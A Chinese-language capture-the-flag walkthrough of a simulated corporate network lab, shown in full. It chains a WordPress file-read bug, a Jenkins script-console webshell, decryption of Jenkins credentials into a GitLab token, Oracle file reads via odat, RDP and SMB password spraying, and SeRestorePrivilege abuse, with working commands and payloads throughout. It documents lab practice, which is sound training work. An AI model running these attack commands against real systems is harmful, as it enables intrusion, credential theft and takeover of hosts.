---
layout: post
title: Privilege - 春秋云镜
category: [春秋云镜]
tags: [active directory pentesting, wordpress, gitlab, privilege escalation]
---

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/1954286803c1fbd8.png)

靶标介绍：

在这个靶场中，您将扮演一名资深黑客，被雇佣来评估虚构公司 XR Shop 的网络安全。您需要通过渗透测试逐个击破公司暴露在公网的应用，并通过后渗透技巧深入 XR Shop 的内部网络，寻找潜在的弱点和漏洞，并通过滥用 Windows 特权获取管理员权限，最终并获取隐藏在其内部的核心机密。该靶场共有 4 个 Flag，分布于不同的靶机。

| 内网地址     | Host or FQDN         | 简要描述                                             |
| ------------ | -------------------- | ---------------------------------------------------- |
| 172.22.14.7  | XR-JENKINS           | WordPress 服务（80 端口）、jenkins 服务（8080 端口） |
| 172.22.14.16 | gitlab.xiaorang.lab  | gitlab 服务器                                        |
| 172.22.14.31 | XR-ORACLE            | oracle 数据库服务器                                  |
| 172.22.14.46 | XR-0923.xiaorang.lab | 内网 PC 机                                           |
| 172.22.14.11 | XR-DC.xiaorang.lab   | 域控                                                 |

## 第 1 关

关卡剧情：

请获取 XR Shop 官网源码的备份文件，并尝试获得系统上任意文件读取的能力。并且，管理员在配置 Jenkins 时，仍然选择了使用初始管理员密码，请尝试读取该密码并获取 Jenkins 服务器权限。Jenkins 配置目录为 `C:\ProgramData\Jenkins\.jenkins`。

---

80 端口网站是 WordPress 搭建的，使用 WPScan 进行扫描：

```
PS C:\> docker run -it --rm wpscanteam/wpscan --url http://xx.xx.xx.xx --api-token <https://wpscan.com/profile>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://xx.xx.xx.xx/ [xx.xx.xx.xx]
[+] Started: Sat Jun  3 02:51:33 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02
 |  - X-Powered-By: PHP/7.4.3
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://xx.xx.xx.xx/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://xx.xx.xx.xx/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://xx.xx.xx.xx/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://xx.xx.xx.xx/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://xx.xx.xx.xx/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.2.2 identified (Latest, released on 2023-05-20).
 | Found By: Rss Generator (Passive Detection)
 |  - http://xx.xx.xx.xx/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>
 |  - http://xx.xx.xx.xx/comments/feed/, <generator>https://wordpress.org/?v=6.2.2</generator>

[+] WordPress theme in use: blossom-shop
 | Location: http://xx.xx.xx.xx/wp-content/themes/blossom-shop/
 | Latest Version: 1.1.3 (up to date)
 | Last Updated: 2021-11-11T00:00:00.000Z
 | Readme: http://xx.xx.xx.xx/wp-content/themes/blossom-shop/readme.txt
 | Style URL: http://xx.xx.xx.xx/wp-content/themes/blossom-shop/style.css?ver=1.1.4
 | Style Name: Blossom Shop
 | Style URI: https://blossomthemes.com/wordpress-themes/blossom-shop/
 | Description: Blossom Shop is a clean, fast and feature-rich free WordPress theme to create online stores. It is p...
 | Author: Blossom Themes
 | Author URI: https://blossomthemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://xx.xx.xx.xx/wp-content/themes/blossom-shop/style.css?ver=1.1.4, Match: 'Version: 1.1.4'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] usc-e-shop
 | Location: http://xx.xx.xx.xx/wp-content/plugins/usc-e-shop/
 | Latest Version: 2.8.18 (up to date)
 | Last Updated: 2023-05-16T06:56:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 2.8.18 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://xx.xx.xx.xx/wp-content/plugins/usc-e-shop/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:31 <========================================> (137 / 137) 100.00% Time: 00:00:31

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 19

[+] Finished: Sat Jun  3 02:52:47 2023
[+] Requests Done: 187
[+] Cached Requests: 7
[+] Data Sent: 60.683 KB
[+] Data Received: 17.619 MB
[+] Memory used: 340.32 MB
[+] Elapsed time: 00:01:13
```

存在 [usc-e-shop](https://wordpress.org/plugins/usc-e-shop/advanced/) 插件，但是并没有检测到 [Welcart e-Commerce < 2.8.5 - Unauthenticated Arbitrary File Access (CVE-2022-4140)](https://wpscan.com/vulnerability/0d649a7e-3334-48f7-abca-fff0856e12c7) 漏洞。这里为什么要提下这个漏洞呢，因为后面所使用到的其实就是这个漏洞，只是把漏洞文件的位置改了下。

使用 nuclei 扫描，发现 www.zip 源码备份文件：

```
[php-detect] [http] [info] http://xx.xx.xx.xx [7.4.3]
[metatag-cms] [http] [info] http://xx.xx.xx.xx [WordPress 6.2.2]
[rdp-detect:win2016] [tcp] [info] xx.xx.xx.xx:3389
[wordpress-login] [http] [info] http://xx.xx.xx.xx/wp-login.php
[mysql-detect] [tcp] [info] xx.xx.xx.xx:3306
[robots-txt-endpoint] [http] [info] http://xx.xx.xx.xx/robots.txt
[CVE-2017-5487:usernames] [http] [medium] http://xx.xx.xx.xx/wp-json/wp/v2/users/ [admin]
[wordpress-rdf-user-enum] [http] [info] http://xx.xx.xx.xx/feed/rdf/ [admin]
[zip-backup-files] [http] [medium] http://xx.xx.xx.xx/www.zip [EXT="zip",FILENAME="www"]
```

从备份文件中发现了几个可利用的文件：

| 文件名                 | 简述                                                                         |
| ---------------------- | ---------------------------------------------------------------------------- |
| wp-config.php          | 找到数据库账户密码，且 3306 端口开放，尝试连接数据库，发现存在限制不让外连。 |
| tools\\phpinfo.php     | phpinfo 界面。                                                               |
| tools\\content-log.php | 存在任意文件读取，与 CVE-2022-4140 漏洞文件内容一致。                        |

tools\content-log.php 文件源码：

```php
<?php
$logfile = rawurldecode( $_GET['logfile'] );
// Make sure the file is exist.
if ( file_exists( $logfile ) ) {
  // Get the content and echo it.
  $text = file_get_contents( $logfile );
  echo( $text );
}
exit;

```

可以利用该漏洞读取 Jenkins 的初始管理员密码。

> 注：根据题目提示，当前 Jenkins 配置目录（$JENKINS_HOME）为 `C:\ProgramData\Jenkins\.jenkins`。Jenkins 的默认初始管理员密码存放在 `$JENKINS_HOME/secrets/initialAdminPassword` 文件中。

读取密码 payload：

```
┌──(root㉿kali)-[~]
└─$ curl 'http://xx.xx.xx.xx/tools/content-log.php?logfile=C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword'
510235cf43f14e83b88a9f144199655b（一开始还已为是密文 haha）
```

访问 8080 端口的 Jenkins 服务，使用该密码登录 admin 账户后访问 `/script/` 目录，执行脚本命令：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/ada0a01ea90190ce.png)

命令执行：

```
println "whoami".execute().text
```

向 wordpress 目录中写入 webshell：

```
new File("C:/phpstudy_pro/WWW/shell.php").write('<?php eval($_POST["pass"]);');
```

查看 flag：

```
C:/phpstudy_pro/WWW/ >whoami

nt authority\system
C:/phpstudy_pro/WWW/ >type C:\Users\Administrator\flag\flag01.txt

                                 _         _       _   _
                                | |       | |     | | (_)
  ___ ___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_ _  ___  _ __  ___
 / __/ _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| (_| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \___\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  __/ |
                 |___/


flag01: flag{8ccde3ae-64ea-4c34-bd0f-02d50c587e14}

```

## 第 2 关

关卡剧情：

管理员为 Jenkins 配置了 Gitlab，请尝试获取 Gitlab API Token，并最终获取 Gitlab 中的敏感仓库。获取敏感信息后，尝试连接至 Oracle 数据库，并获取 ORACLE 服务器控制权限。

---

在 `/manage/configure` 目录下可以看到存在 gitlab api token 相关配置，并测试是否能够连接成功：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/cd9891d472e07976.png)

在 `/manage/credentials/` 目录下，可以查看到该唯一标识符（apiTokenId）：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/73cfe2abfb87a300.png)

访问 `/manage/credentials/store/system/domain/_/credential/<apiTokenId>/update` 地址，可以获得密文的 Gitlab API token：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/664f4ce9b06eadf1.png)

也可以通过读取 Jenkins 凭证文件的方式获取密文密码：

```
┌──(root㉿kali)-[~]
└─# curl 'http://xx.xx.xx.xx/tools/content-log.php?logfile=C:\ProgramData\Jenkins\.jenkins\credentials.xml'
<?xml version='1.1' encoding='UTF-8'?>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1214.v1de940103927">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain>
        <specifications/>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <java.util.concurrent.CopyOnWriteArrayList>
        <com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl plugin="gitlab-plugin@1.6.0">
          <scope>GLOBAL</scope>
          <id>9eca4a05-e058-4810-b952-bd6443e6d9a8</id>
          <description></description>
          <apiToken>{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}</apiToken>
        </com.dabsquared.gitlabjenkins.connection.GitLabApiTokenImpl>
      </java.util.concurrent.CopyOnWriteArrayList>
    </entry>
  </domainCredentialsMap>
</com.cloudbees.plugins.credentials.SystemCredentialsProvider>
```

此时需要回到“脚本命令行”界面，解密该密文，获得明文的 token：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/ce5c965e5b3a092e.png)

```
println(hudson.util.Secret.decrypt("{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}"))

# or

println(hudson.util.Secret.fromString("{AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh}").getPlainText())

# output: glpat-7kD_qLH2PiQv_ywB9hz2
```

> 注：不同版本的 jenkins 中用于解密的类可能有所不同，可尝试使用 hudson.util.Secret.decrypt 或 hudson.util.Secret.fromString 进行解密。

最方便的方法是，在“脚本命令行”界面运行以下 [Groovy script](https://www.groovy-lang.org/) 即可解密 Jenkins 服务器上所有的凭证信息：

```groovy
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{
  it.properties.each { prop, val ->
    println(prop + ' = "' + val + '"')
  }
  println("-----------------------")
}
```

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/f58eb1ea2246c755.png)

使用 Access Token 去请求 GitLab API，返回所有的项目列表：

```
┌──(root㉿kali)-[/home/kali]
└─# proxychains4 -q curl --header "PRIVATE-TOKEN: glpat-7kD_qLH2PiQv_ywB9hz2" http://gitlab.xiaorang.lab/api/v4/projects | python -m json.tool
```

> 获取所有公开项目：`curl http://gitlab.example.com/api/v4/projects?visibility=public`

在 `git clone` 命令中，使用 gitlab 的 access token 拉取私有仓库：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q git clone http://oauth2:glpat-7kD_qLH2PiQv_ywB9hz2@gitlab.xiaorang.lab/xrlab/xradmin.git
Cloning into 'xradmin'...
remote: Enumerating objects: 869, done.
remote: Counting objects: 100% (869/869), done.
remote: Compressing objects: 100% (636/636), done.
remote: Total 869 (delta 155), reused 854 (delta 150), pack-reused 0
Receiving objects: 100% (869/869), 3.44 MiB | 598.00 KiB/s, done.
Resolving deltas: 100% (155/155), done.
Updating files: 100% (607/607), done.

┌──(root㉿kali)-[~]
└─# proxychains4 -q git clone http://oauth2:glpat-7kD_qLH2PiQv_ywB9hz2@gitlab.xiaorang.lab/xrlab/internal-secret.git
Cloning into 'internal-secret'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (6/6), 6.48 KiB | 829.00 KiB/s, done.

┌──(root㉿kali)-[~]
└─# proxychains4 -q git clone http://oauth2:glpat-7kD_qLH2PiQv_ywB9hz2@gitlab.xiaorang.lab/xrlab/awenode.git
Cloning into 'awenode'...
remote: Enumerating objects: 24, done.
remote: Total 24 (delta 0), reused 0 (delta 0), pack-reused 24
Receiving objects: 100% (24/24), 15.09 KiB | 429.00 KiB/s, done.
Resolving deltas: 100% (1/1), done.

┌──(root㉿kali)-[~]
└─# proxychains4 -q git clone http://oauth2:glpat-7kD_qLH2PiQv_ywB9hz2@gitlab.xiaorang.lab/xrlab/xrwiki.git
Cloning into 'xrwiki'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6
Receiving objects: 100% (6/6), done.

┌──(root㉿kali)-[~]
└─# proxychains4 -q git clone http://oauth2:glpat-7kD_qLH2PiQv_ywB9hz2@gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring.git
Cloning into 'Monitoring'...
warning: You appear to have cloned an empty repository.
```

在 `gitlab.xiaorang.lab/xrlab/xradmin.git` 项目（[RuoYi-Oracle](https://gitee.com/racsu/RuoYi-Oracle)）下的 `xradmin\ruoyi-admin\src\main\resources\application-druid.yml` 文件中存在数据库账号密码：

| oracle 数据库连接地址                    | 账号    | 密码            |
| ---------------------------------------- | ------- | --------------- |
| jdbc:oracle:thin:@172.22.14.31:1521/orcl | xradmin | fcMyE8t9E4XdsKf |

Oracle 数据库还得用 [odat](https://www.kali.org/tools/odat/)，使用 odat 以 sysdba 权限来检测该数据库的利用点，发现可以利用 UTL_FILE 读取文件，以及存在 CVE-2018-3004 漏洞：

```
┌──(root㉿kali)-[~]
└─# proxychains -q odat all -s 172.22.14.31 -d orcl -U xradmin -P fcMyE8t9E4XdsKf --sysdba
[+] Checking if target 172.22.14.31:1521 is well configured for a connection...
[+] According to a test, the TNS listener 172.22.14.31:1521 is well configured. Continue...

[1] (172.22.14.31:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?
[+] The target is vulnerable to a remote TNS poisoning

[2] (172.22.14.31:1521): Testing all authenticated modules on sid:orcl with the xradmin/fcMyE8t9E4XdsKf account
[2.1] UTL_HTTP library ?
[+] OK
[2.2] HTTPURITYPE library ?
16:56:18 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-12541: TNS:no listener ORA-06512: at "SYS.HTTPURITYPE", line 34`
[+] OK
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[+] OK
[2.5] Bypass built in Oracle JVM security (CVE-2018-3004)?
[-] KO
[2.6] DBMSADVISOR library ?
[+] OK
[2.7] DBMSSCHEDULER library ?
[+] OK
[2.8] CTXSYS library ?
[+] OK
[2.9] Hashed Oracle passwords ?
[+] OK
[2.10] Hashed Oracle passwords from history?
[+] OK
[2.11] DBMS_XSLPROCESSOR library ?
[+] OK
[2.12] External table to read files ?
[+] OK
[2.13] External table to execute system commands ?
[+] OK
[2.14] Oradbg ?
[-] KO
[2.15] DBMS_LOB to read files ?
[+] OK
[2.16] SMB authentication capture ?
[+] Perhaps (try with --capture to be sure)
[2.17] Gain elevated access (privilege escalation)?
[2.17.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[+] OK
[2.17.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[2.17.3] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[2.17.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[2.17.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[2.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[+] Impossible to know
[2.19] Create file on target (CVE-2018-3004)?
[+] OK
[2.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[-] KO

[3] (172.22.14.31:1521): Oracle users have not the password identical to the username ?
The login XRADMIN has already been tested at least once. What do you want to do:                                                                                   | ETA:  00:00:20
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
s
100% |#############################################################################################################################################################| Time: 00:01:19
[-] No found a valid account on 172.22.14.31:1521/sid:orcl with usernameLikePassword module

```

利用 UTL_FILE 读取 flag 文件：

```
┌──(root㉿kali)-[~]
└─# proxychains -q odat utlfile -s 172.22.14.31 -d orcl -U xradmin -P fcMyE8t9E4XdsKf --sysdba --test-module --getFile C:/Users/Administrator/flag flag02.txt flag02.txt

[1] (172.22.14.31:1521): Test if the UTL_FILE library can be used
[1.1] UTL_FILE library ?
[+] OK

[2] (172.22.14.31:1521): Read the flag02.txt file stored in C:/Users/Administrator/flag on the 172.22.14.31 server
[+] Data stored in the flag02.txt file sored in C:/Users/Administrator/flag (copied in flag02.txt locally):
b'   __ _                      _               (_)           _      \n  / _` |   ___     ___    __| |     o O O    | |    ___   | |__   \n  \\__, |  / _ \\   / _ \\  / _` |    o        _/ |   / _ \\  | \'_ \\  \n  |___/   \\___/   \\___/  \\__,_|   TS__[O]  |__/_   \\___/  |_.__/  \n_|"""""|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""|_|"""""| \n"`-0-0-\'"`-0-0-\'"`-0-0-\'"`-0-0-\'./o--000\'"`-0-0-\'"`-0-0-\'"`-0-0-\' \n\nflag02: flag{8e927f44-068f-4f6b-bc81-7691178d5248}\n'

```

还可以使用 [PLSQL Developer](https://www.allroundautomations.com/products/pl-sql-developer/) 连接数据库，进行其他操作：

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/18cd896206b1ea22.png)

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/a1a25be4b1e825a2.png)

在 `gitlab.xiaorang.lab/xrlab/internal-secret.git` 项目（“内部机密”🤣 haha）中只有一个存放着主机账号密码凭证的文件：`credentials.txt`。

## 第 3 关

关卡剧情：

攻击办公区内网，获取办公 PC 控制权限，并通过特权滥用提升至 SYSTEM 权限。

---

在 credentials.txt 文件中找到了域内主机 XR-0923 的本地用户密码：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q ./cme smb 172.22.14.7/24 -u zhangshuai -p wSbEajHzZs --local-auth
SMB         172.22.14.7     445    XR-JENKINS       [*] Windows 10.0 Build 17763 x64 (name:XR-JENKINS) (domain:XR-JENKINS) (signing:False) (SMBv1:False)
SMB         172.22.14.11    445    XR-DC            [*] Windows 10.0 Build 20348 x64 (name:XR-DC) (domain:XR-DC) (signing:True) (SMBv1:False)
SMB         172.22.14.46    445    XR-0923          [*] Windows 10.0 Build 20348 x64 (name:XR-0923) (domain:XR-0923) (signing:False) (SMBv1:False)
SMB         172.22.14.31    445    XR-ORACLE        [*] Windows 10.0 Build 17763 x64 (name:XR-ORACLE) (domain:XR-ORACLE) (signing:False) (SMBv1:False)
SMB         172.22.14.46    445    XR-0923          [+] XR-0923\zhangshuai:wSbEajHzZs
SMB         172.22.14.7     445    XR-JENKINS       [-] XR-JENKINS\zhangshuai:wSbEajHzZs STATUS_LOGON_FAILURE
SMB         172.22.14.11    445    XR-DC            [-] XR-DC\zhangshuai:wSbEajHzZs STATUS_LOGON_FAILURE
SMB         172.22.14.31    445    XR-ORACLE        [-] XR-ORACLE\zhangshuai:wSbEajHzZs STATUS_LOGON_FAILURE
```

在 hydra 中使用这些凭证对其它主机也进行了爆破，依然只有这一个有效凭证：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q hydra -C ./user_passwd.txt -M ./targets.txt rdp -f
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-04 23:22:47
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 3 servers, overall 12 tasks, 242 login tries, ~61 tries per task
[DATA] attacking rdp://(3 targets):3389/

[3389][rdp] host: 172.22.14.46   login: zhangshuai   password: wSbEajHzZs

[STATUS] attack finished for 172.22.14.46 (valid pair found)
[ERROR] child 10 sent nonsense data, killing and restarting it!
[STATUS] 581.00 tries/min, 581 tries in 00:01h, 145 to do in 00:01h, 8 active
3 of 3 targets successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-04 23:23:56
```

使用 RDP 登录后，打开的 PowerShell 会话默认完整性级别（Integrity Levels）为中：

```console
PS C:\Users\zhangshuai\Desktop> whoami /all

用户信息
----------------

用户名             SID
================== =============================================
xr-0923\zhangshuai S-1-5-21-754105099-1176710061-2177073800-1001


组信息
-----------------

组名                                   类型   SID          属性
====================================== ====== ============ ==============================
Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Remote Desktop Users           别名   S-1-5-32-555 必需的组, 启用于默认, 启用的组
BUILTIN\Remote Management Users        别名   S-1-5-32-580 必需的组, 启用于默认, 启用的组
BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\REMOTE INTERACTIVE LOGON  已知组 S-1-5-14     必需的组, 启用于默认, 启用的组
NT AUTHORITY\INTERACTIVE               已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
NT AUTHORITY\本地帐户                  已知组 S-1-5-113    必需的组, 启用于默认, 启用的组
LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication       已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\Medium Mandatory Level 标签   S-1-16-8192


特权信息
----------------------

特权名                        描述           状态
============================= ============== ======
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用


用户声明信息
-----------------------

用户声明未知。

已在此设备上禁用对动态访问控制的 Kerberos 支持。
```

以管理员身份运行的 PowerShell 才会拥有 SeRestorePrivilege 特权，此时完整性级别显示为 `Mandatory Label\High Mandatory Level`，但任然访问不了 Administrator 用户目录：

```console
PS C:\Windows\system32> whoami /all

用户信息
----------------

用户名             SID
================== =============================================
xr-0923\zhangshuai S-1-5-21-754105099-1176710061-2177073800-1001


组信息
-----------------

组名                                 类型   SID          属性
==================================== ====== ============ ==============================
Everyone                             已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Remote Desktop Users         别名   S-1-5-32-555 必需的组, 启用于默认, 启用的组
BUILTIN\Remote Management Users      别名   S-1-5-32-580 必需的组, 启用于默认, 启用的组
BUILTIN\Users                        别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\INTERACTIVE             已知组 S-1-5-4      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users     已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization       已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
NT AUTHORITY\本地帐户                已知组 S-1-5-113    必需的组, 启用于默认, 启用的组
LOCAL                                已知组 S-1-2-0      必需的组, 启用于默认, 启用的组
NT AUTHORITY\NTLM Authentication     已知组 S-1-5-64-10  必需的组, 启用于默认, 启用的组
Mandatory Label\High Mandatory Level 标签   S-1-16-12288


特权信息
----------------------

特权名                        描述           状态
============================= ============== ======
SeRestorePrivilege            还原文件和目录 已禁用
SeChangeNotifyPrivilege       绕过遍历检查   已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用


用户声明信息
-----------------------

用户声明未知。

已在此设备上禁用对动态访问控制的 Kerberos 支持。

PS C:\Windows\system32> dir C:\Users\Administrator\
dir : 对路径“C:\Users\Administrator”的访问被拒绝。
所在位置 行:1 字符: 1
+ dir C:\Users\Administrator\
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Administrator\:String) [Get-ChildItem], UnauthorizedAccessEx
   ception
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

```

使用 WinRM 连接主机，会直接获取到高完整性级别并且启用所有已拥有的特权：

```
┌──(root㉿kali)-[~]
└─# proxychains4 -q cme winrm 172.22.14.46 -u zhangshuai -p wSbEajHzZs --local-auth -X 'whoami /priv'
SMB         172.22.14.46    5985   XR-0923          [*] Windows 10.0 Build 20348 (name:XR-0923) (domain:XR-0923)
HTTP        172.22.14.46    5985   XR-0923          [*] http://172.22.14.46:5985/wsman
HTTP        172.22.14.46    5985   XR-0923          [+] XR-0923\zhangshuai:wSbEajHzZs (Pwn3d!)
HTTP        172.22.14.46    5985   XR-0923          [+] Executed command
HTTP        172.22.14.46    5985   XR-0923
HTTP        172.22.14.46    5985   XR-0923          特权信息
HTTP        172.22.14.46    5985   XR-0923          ----------------------
HTTP        172.22.14.46    5985   XR-0923
HTTP        172.22.14.46    5985   XR-0923          特权名                        描述           状态
HTTP        172.22.14.46    5985   XR-0923          ============================= ============== ======
HTTP        172.22.14.46    5985   XR-0923          SeRestorePrivilege            还原文件和目录 已启用
HTTP        172.22.14.46    5985   XR-0923          SeChangeNotifyPrivilege       绕过遍历检查   已启用
HTTP        172.22.14.46    5985   XR-0923          SeIncreaseWorkingSetPrivilege 增加进程工作集 已启用
```

利用 [SeRestorePrivilege](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/restore-files-and-directories) 特权可以直接修改文件的所有者和操作权限：

```powershell
# 配置文件和用户
$Path = "C:\Users\Administrator"
$User = $env:USERNAME

# 修改文件所有者
$Acl = Get-Acl -Path $Path
$Acl.SetOwner([System.Security.Principal.NTAccount] $User)
Set-Acl -Path $Path -AclObject $Acl

# 查看文件所有者
$Acl = Get-Acl -Path $Path
$Owner = $Acl.Owner
$Owner

# 获取文件完全控制权
$Acl = Get-Acl -Path $Path
$AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule($User, "FullControl", "ContainerInherit,ObjectInherit", "None", "Allow")
$Acl.SetAccessRule($AccessRule)
Set-Acl -Path $Path -AclObject $Acl

```

修改目录权限后，可以直接查看 flag 文件内容。

尝试创建注册表进行镜像劫持提权不成功：

```console
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v debugger /t reg_sz /d c:\windows\system32\cmd.exe /f
reg.exe : 错误: 拒绝访问。
    + CategoryInfo          : NotSpecified: (错误: 拒绝访问。:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

尝试修改注册表路径所有者和操作权限也不成功：

```console
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> $Path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> $User = $env:USERNAME
*Evil-WinRM* PS C:\Users\zhangshuai\Documents>
*Evil-WinRM* PS C:\Users\zhangshuai\Documents> $Acl = Get-Acl -Path $Path
